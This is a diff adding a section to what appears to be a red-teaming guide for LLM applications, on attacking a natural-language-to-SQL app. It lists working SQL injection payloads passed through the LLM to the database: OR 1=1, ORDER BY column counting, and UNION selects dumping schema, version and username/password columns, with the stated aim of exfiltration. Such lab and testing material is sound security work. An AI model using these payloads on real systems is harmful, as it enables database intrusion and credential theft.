@@ -236,6 +236,40 @@ Here are the latest customer reviews:
 | **Context** | Natural language to SQL application — user queries a database using plain English, LLM translates to SQL and executes |
 | **Goal** | Enumerate all table names to map the database schema before targeted exfiltration |
 | **Vulnerability** | SQL Injection — unauthorized schema access |
+
+>Remember, the LLM could attach directly the input to query the database. Here some basic payloads:
+
+- Basic injection:
+
+```sql
+offsec' OR 1=1 -- //
+```
+
+- Check the number of columns: Increase the number until I receive an error, then the number before will be the number of columns:
+
+```sql
+' ORDER BY 1-- //
+```
+
+- Union SQL Injection:
+
+```sql
+' UNION SELECT null, null, database(), user(), @@version -- //
+```
+
+- Union SQL Injection, get database information:
+
+```sql
+' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+```
+
+- Union SQL Injection, get information from specific database:
+
+```sql
+' UNION SELECT null, username, password, description, null FROM users -- //
+```
+
+As additional resource check: [Lab SQLi and Functions Vulnerable with Command Injection](./labs/00-LAB-SQLi-Vulnerable-Functions-Command-Injection.md)
  
 **Step 1 — Confirm the application passes LLM output directly to the database**
  
